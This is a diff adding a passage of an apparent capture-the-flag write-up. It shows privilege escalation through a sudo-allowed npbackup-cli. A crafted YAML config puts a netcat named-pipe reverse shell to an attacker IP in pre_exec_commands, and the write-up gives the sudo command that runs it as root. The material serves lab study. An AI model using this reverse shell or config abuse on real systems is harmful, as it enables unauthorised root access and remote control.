@@ -171,6 +171,134 @@ n11
 
 -----------------
 
+- User `marco` can run this as root.
 
+<img width="1274" height="181" alt="image" src="https://github.com/user-attachments/assets/6705a258-ad63-4506-91fc-b642f6906d2f" />
 
+- I checked the configuration file and noticed that we can execute shell commands before a task.We can use this to execute shell commands.
 
+<img width="577" height="221" alt="image" src="https://github.com/user-attachments/assets/12f1db00-4d0c-48d6-98fa-eb6e29c179a1" />
+
+- Configuration file's proof of concept-:
+
+```yaml
+conf_version: 3.0.1
+repos:
+  default:
+    repo_uri: /home/marco/backups/
+    repo_group: default_group
+    backup_opts:
+      paths:
+      - /tmp/
+      tags: []
+      minimum_backup_size_error: 400 Kib
+      exclude_files_larger_than: 0.0 Kib
+    repo_opts:
+      repo_password: test
+      upload_speed: 100.0 Mib
+      download_speed: 0.0 Kib
+      retention_policy: {}
+    prometheus: {}
+    env:
+      env_variables: {}
+      encrypted_env_variables: {}
+groups:
+  default_group:
+    backup_opts:
+      paths: []
+      source_type:
+      tags: []
+      compression: auto
+      use_fs_snapshot: false
+      ignore_cloud_files: true
+      exclude_caches: true
+      one_file_system: true
+      priority: low
+      excludes_case_ignore: false
+      exclude_files:
+      - excludes/generic_excluded_extensions
+      - excludes/generic_excludes
+      - excludes/windows_excludes
+      - excludes/linux_excludes
+      exclude_patterns:
+      exclude_files_larger_than:
+      additional_parameters:
+      additional_backup_only_parameters:
+      minimum_backup_size_error: 10 MiB
+      pre_exec_commands: ["rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.128 8081 >/tmp/f"]
+      pre_exec_per_command_timeout: 3600
+      pre_exec_failure_is_fatal: false
+      post_exec_commands: []
+      post_exec_per_command_timeout: 3600
+      post_exec_failure_is_fatal: false
+      post_exec_execute_even_on_backup_error: true
+      post_backup_housekeeping_percent_chance: 0
+      post_backup_housekeeping_interval: 0
+    repo_opts:
+      repo_password:
+      repo_password_command:
+      minimum_backup_age: 1435
+      random_delay_before_backup: 3
+      upload_speed: 100 Mib
+      download_speed: 0 Mib
+      backend_connections: 0
+      retention_policy:
+        last: 3
+        hourly: 72
+        daily: 30
+        weekly: 4
+        monthly: 12
+        yearly: 3
+        keep_tags: []
+        apply_on_tags: []
+        keep_within: true
+        ntp_server:
+      prune_max_unused: 0 B
+      prune_max_repack_size:
+    prometheus:
+      backup_job: ${MACHINE_ID}
+      group: ${MACHINE_GROUP}
+    env:
+      env_variables: {}
+      encrypted_env_variables: {}
+identity:
+  machine_id: ${HOSTNAME}__Zo6u
+  machine_group:
+global_prometheus:
+  metrics: false
+  instance: ${MACHINE_ID}
+  destination:
+  http_username:
+  http_password:
+  additional_labels: {}
+global_options:
+  auto_upgrade: false
+  auto_upgrade_percent_chance: 15
+  auto_upgrade_interval: 0
+  auto_upgrade_server_url:
+  auto_upgrade_server_username:
+  auto_upgrade_server_password:
+  auto_upgrade_host_identity: ${MACHINE_ID}
+  auto_upgrade_group: ${MACHINE_GROUP}
+```
+
+- Trigger it by trying to backup with option `-b`.
+
+Command-:
+`sudo /usr/local/bin/npbackup-cli -c me.conf -b`
+
+<img width="1898" height="595" alt="image" src="https://github.com/user-attachments/assets/a1d4170b-e3e3-4bc2-ad56-95d6b0c9b6c0" />
+
+- Root-:
+
+<img width="830" height="574" alt="image" src="https://github.com/user-attachments/assets/d96a1091-d8d9-45ff-94a4-f8c4b3f04e06" />
+
+----------
+
+### Reference
+
+-----------
+
+- [js2py](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape)
+
+-----------
